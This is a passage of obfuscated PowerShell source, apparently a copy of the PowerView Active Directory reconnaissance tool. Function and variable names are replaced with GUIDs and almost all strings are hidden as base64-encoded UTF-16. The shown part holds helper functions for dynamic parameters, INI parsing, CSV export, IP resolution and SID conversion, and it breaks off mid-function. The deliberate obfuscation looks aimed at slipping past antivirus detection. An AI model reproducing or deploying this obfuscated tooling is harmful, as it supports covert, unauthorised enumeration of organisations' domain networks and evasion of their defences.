            if($_.GetType().Name -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdABpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            $true
        })]
        $BoundParameters
    )
    Begin {
        ${59e07e3fbdca49f893212c9cba43366d} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        ${459cce706e2d490682012ec182898212} = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            ${76cc32a0b71a4c62a0b5d07ada16b7ea} = $BoundParameters.Keys | Where-Object { ${459cce706e2d490682012ec182898212} -notcontains $_ }
            ForEach(${91869323bc2b4dd88b0d3083dac350ce} in ${76cc32a0b71a4c62a0b5d07ada16b7ea}) {
                if (${91869323bc2b4dd88b0d3083dac350ce}) {
                    Set-Variable -Name ${91869323bc2b4dd88b0d3083dac350ce} -Value $BoundParameters.${91869323bc2b4dd88b0d3083dac350ce} -Scope 1 -Force
                }
            }
        }
        else {
            ${43e0cfa530c14a62a4812e8f7ef2e684} = @()
            ${43e0cfa530c14a62a4812e8f7ef2e684} = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if(${43e0cfa530c14a62a4812e8f7ef2e684}) {
                ${43e0cfa530c14a62a4812e8f7ef2e684} | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            ${4227e544b4db4e3e8cf0c4b00751091b} = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            ${1df42bb306754e6cb4baae099f6e223d} = $null
            ForEach (${91869323bc2b4dd88b0d3083dac350ce} in ${4227e544b4db4e3e8cf0c4b00751091b}) {
                ${e8fd3480e83349d784e674b9d1ae2991} = Get-Variable -Name ${91869323bc2b4dd88b0d3083dac350ce} -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue(${91869323bc2b4dd88b0d3083dac350ce}, [ref]${1df42bb306754e6cb4baae099f6e223d}) -and ${e8fd3480e83349d784e674b9d1ae2991}) {
                    $PSBoundParameters.${91869323bc2b4dd88b0d3083dac350ce} = ${e8fd3480e83349d784e674b9d1ae2991}
                }
            }
            if($Dictionary) {
                ${a64eba62a7504fe9bad0148765e3f9e9} = $Dictionary
            }
            else {
                ${a64eba62a7504fe9bad0148765e3f9e9} = ${59e07e3fbdca49f893212c9cba43366d}
            }
            ${549d4e74e1e84d359ebd51ef79ad9908} = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            ${ac9a5c3761b34caeb19470b07672f868} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAHAATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZwBBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
            ${fca35ede994e42fdb329c7f891c4ebdf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcgBpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AFYAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZwB0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAHQAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbABpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AFYAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')))
            ${f32316c10b824f78afe69aced2f6303b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBBAGwAaQBhAHMAJAA=')))
            ${cf81d659565e4928b09207d35c681e84} = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                ${ac9a5c3761b34caeb19470b07672f868} {
                    Try {
                        ${cf81d659565e4928b09207d35c681e84}.$_ = . ${549d4e74e1e84d359ebd51ef79ad9908}
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if(${a64eba62a7504fe9bad0148765e3f9e9}.Keys -contains $Name) {
                ${a64eba62a7504fe9bad0148765e3f9e9}.$Name.Attributes.Add(${cf81d659565e4928b09207d35c681e84})
            }
            else {
                ${684581d0da6b4a53bb41c3e0a6b9ba00} = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    ${fca35ede994e42fdb329c7f891c4ebdf} {
                        Try {
                            ${edc1d884bcbe494a9851fd372fa5f569} = New-Object -TypeName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAewBfAH0AQQB0AHQAcgBpAGIAdQB0AGUA'))) -ArgumentList (. ${549d4e74e1e84d359ebd51ef79ad9908}) -ErrorAction Stop
                            ${684581d0da6b4a53bb41c3e0a6b9ba00}.Add(${edc1d884bcbe494a9851fd372fa5f569})
                        }
                        Catch { $_ }
                        continue
                    }
                    ${f32316c10b824f78afe69aced2f6303b} {
                        Try {
                            ${6410749691084fbdb77d2972b9f045b7} = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. ${549d4e74e1e84d359ebd51ef79ad9908}) -ErrorAction Stop
                            ${684581d0da6b4a53bb41c3e0a6b9ba00}.Add(${6410749691084fbdb77d2972b9f045b7})
                            continue
                        }
                        Catch { $_ }
                    }
                }
                ${684581d0da6b4a53bb41c3e0a6b9ba00}.Add(${cf81d659565e4928b09207d35c681e84})
                ${91869323bc2b4dd88b0d3083dac350ce} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, ${c8f42b8a5203479ba051f687fab516f8}, ${684581d0da6b4a53bb41c3e0a6b9ba00})
                ${a64eba62a7504fe9bad0148765e3f9e9}.Add($Name, ${91869323bc2b4dd88b0d3083dac350ce})
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            ${a64eba62a7504fe9bad0148765e3f9e9}
        }
    }
}
function a08b2dc4f53043ccbee4608b1cf113eb {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        ${e6bf711304b24cf590cbb5b6c4bdb1de}
    )
    BEGIN {
        ${a7a08ce980304e968286c9b55cb03dc0} = @{}
    }
    PROCESS {
        ForEach (${f2c826b07a43443aaca3dc6e400f36f1} in $Path) {
            if ((${f2c826b07a43443aaca3dc6e400f36f1} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${a7323df48bb0410394bda78f8d71db4a} = (New-Object System.Uri(${f2c826b07a43443aaca3dc6e400f36f1})).Host
                if (-not ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}]) {
                    b62ba051179546ed8285f6844e069492 -ac645935110b4eaea96e7bf6f0b2d7f4 ${a7323df48bb0410394bda78f8d71db4a} -Credential $Credential
                    ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}] = $True
                }
            }
            if (Test-Path -Path ${f2c826b07a43443aaca3dc6e400f36f1}) {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                    ${f8e4c3b086ec4e1fab377e01017224ae} = New-Object PSObject
                }
                else {
                    ${f8e4c3b086ec4e1fab377e01017224ae} = @{}
                }
                Switch -Regex -File ${f2c826b07a43443aaca3dc6e400f36f1} {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
                    {
                        ${1eac3615dbdb44c8aae0560b5a30b6d9} = $matches[1].Trim()
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            ${1eac3615dbdb44c8aae0560b5a30b6d9} = ${1eac3615dbdb44c8aae0560b5a30b6d9}.Replace(' ', '')
                            ${e48e5e9a86e74b54a4919b77528bb40e} = New-Object PSObject
                            ${f8e4c3b086ec4e1fab377e01017224ae} | Add-Member Noteproperty ${1eac3615dbdb44c8aae0560b5a30b6d9} ${e48e5e9a86e74b54a4919b77528bb40e}
                        }
                        else {
                            ${f8e4c3b086ec4e1fab377e01017224ae}[${1eac3615dbdb44c8aae0560b5a30b6d9}] = @{}
                        }
                        ${7656a871735148e8a896090b68b0ae4e} = 0
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
                    {
                        ${b3874b8ac7dd49169d7fc6f9142c78e3} = $matches[1].Trim()
                        ${7656a871735148e8a896090b68b0ae4e} = ${7656a871735148e8a896090b68b0ae4e} + 1
                        $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + ${7656a871735148e8a896090b68b0ae4e}
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${f8e4c3b086ec4e1fab377e01017224ae}.${1eac3615dbdb44c8aae0560b5a30b6d9} | Add-Member Noteproperty $Name ${b3874b8ac7dd49169d7fc6f9142c78e3}
                        }
                        else {
                            ${f8e4c3b086ec4e1fab377e01017224ae}[${1eac3615dbdb44c8aae0560b5a30b6d9}][$Name] = ${b3874b8ac7dd49169d7fc6f9142c78e3}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
                        $Name, ${b3874b8ac7dd49169d7fc6f9142c78e3} = $matches[1..2]
                        $Name = $Name.Trim()
                        ${114c99d947ed4f4badf808a702e6994d} = ${b3874b8ac7dd49169d7fc6f9142c78e3}.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${f8e4c3b086ec4e1fab377e01017224ae}.${1eac3615dbdb44c8aae0560b5a30b6d9} | Add-Member Noteproperty $Name ${114c99d947ed4f4badf808a702e6994d}
                        }
                        else {
                            ${f8e4c3b086ec4e1fab377e01017224ae}[${1eac3615dbdb44c8aae0560b5a30b6d9}][$Name] = ${114c99d947ed4f4badf808a702e6994d}
                        }
                    }
                }
                ${f8e4c3b086ec4e1fab377e01017224ae}
            }
        }
    }
    END {
        ${a7a08ce980304e968286c9b55cb03dc0}.Keys | a7d442a86d1b4ceeaa8f4ca925e39550
    }
}
function Export-PowerViewCSV {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
    BEGIN {
        ${d5b87219808042299bae81315d47676d} = [IO.Path]::GetFullPath($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))])
        ${35d7ac4a3e4c48ef97a5ddee8c3b442d} = [System.IO.File]::Exists(${d5b87219808042299bae81315d47676d})
        ${261eaab43704454fbafbf26f345a1cbe} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        $Null = ${261eaab43704454fbafbf26f345a1cbe}.WaitOne()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            ${341bee262da1408b9f2624f20eb0d757} = [System.IO.FileMode]::Append
        }
        else {
            ${341bee262da1408b9f2624f20eb0d757} = [System.IO.FileMode]::Create
            ${35d7ac4a3e4c48ef97a5ddee8c3b442d} = $False
        }
        ${620378db7d45449dbc3120b333899b80} = New-Object IO.FileStream(${d5b87219808042299bae81315d47676d}, ${341bee262da1408b9f2624f20eb0d757}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${944f7407aa6f49f28887c95a5ad1bcc8} = New-Object System.IO.StreamWriter(${620378db7d45449dbc3120b333899b80})
        ${944f7407aa6f49f28887c95a5ad1bcc8}.AutoFlush = $True
    }
    PROCESS {
        ForEach (${d52add069fcb40558b75c2b54ec44ab4} in $InputObject) {
            ${8cdba72e08724850807f96f82704e5fd} = ConvertTo-Csv -InputObject ${d52add069fcb40558b75c2b54ec44ab4} -Delimiter $Delimiter -NoTypeInformation
            if (-not ${35d7ac4a3e4c48ef97a5ddee8c3b442d}) {
                ${8cdba72e08724850807f96f82704e5fd} | ForEach-Object { ${944f7407aa6f49f28887c95a5ad1bcc8}.WriteLine($_) }
                ${35d7ac4a3e4c48ef97a5ddee8c3b442d} = $True
            }
            else {
                ${8cdba72e08724850807f96f82704e5fd}[1..(${8cdba72e08724850807f96f82704e5fd}.Length-1)] | ForEach-Object { ${944f7407aa6f49f28887c95a5ad1bcc8}.WriteLine($_) }
            }
        }
    }
    END {
        ${261eaab43704454fbafbf26f345a1cbe}.ReleaseMutex()
        ${944f7407aa6f49f28887c95a5ad1bcc8}.Dispose()
        ${620378db7d45449dbc3120b333899b80}.Dispose()
    }
}
function e2da9d93a1f04bbe8fe558de28bcac3c {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${Env:ac645935110b4eaea96e7bf6f0b2d7f4}
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            try {
                @(([Net.Dns]::GetHostEntry(${a9e149a622e146cb8c4c690f286bb4b0})).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
                        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                        ${135b3fb143bd49b987991226741987e6}
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAcwBvAGwAdgBlAC0ASQBQAEEAZABkAHIAZQBzAHMAXQAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHMAbwBsAHYAZQAgACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
            }
        }
    }
}
function dc5909cabc884d258719b96ec7cf3c2b {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        ${d43566a07dda43778aacb7392fc974f0},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${95abe48132c9449d9de904bd23bbecb3} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Object in ${d43566a07dda43778aacb7392fc974f0}) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${0e64fea2836d457194968445e6b46921} = a4ad8c5db2444528bab99963038ffd7c -Identity $Object -d6f8ca3d1c994c23b84c147c1aa4c2c9 'DN' @95abe48132c9449d9de904bd23bbecb3
                if (${0e64fea2836d457194968445e6b46921}) {
                    $UserDomain = ${0e64fea2836d457194968445e6b46921}.SubString(${0e64fea2836d457194968445e6b46921}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = ${0e64fea2836d457194968445e6b46921}.Split(',')[0].split('=')[1]
                    ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                    ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                    ${95abe48132c9449d9de904bd23bbecb3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    dc2f41a670d5455b8f64f106e1b09449 @95abe48132c9449d9de904bd23bbecb3 | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${95abe48132c9449d9de904bd23bbecb3} = @{}
                        $Domain = (c57d9aa48a49482b961291cafd0dde18 @95abe48132c9449d9de904bd23bbecb3).Name
                    }
                    ${1959334197ad4134adbf78a13c843527} = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    ${1959334197ad4134adbf78a13c843527}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AFQAbwAtAFMASQBEAF0AIABFAHIAcgBvAHIAIABjAG8AbgB2AGUAcgB0AGkAbgBnACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQAIAA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function e867aff561cb4dacb74c955fc46aa9c1 {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${23ca6558fa4b4ce695fc6d89d0b892e5},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${b36bf00903c14682a2e243a875596f28} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${0060f067032040ef8393c187e7a9dae3} in ${23ca6558fa4b4ce695fc6d89d0b892e5}) {
            ${0060f067032040ef8393c187e7a9dae3} = ${0060f067032040ef8393c187e7a9dae3}.trim('*')
            try {
                Switch (${0060f067032040ef8393c187e7a9dae3}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
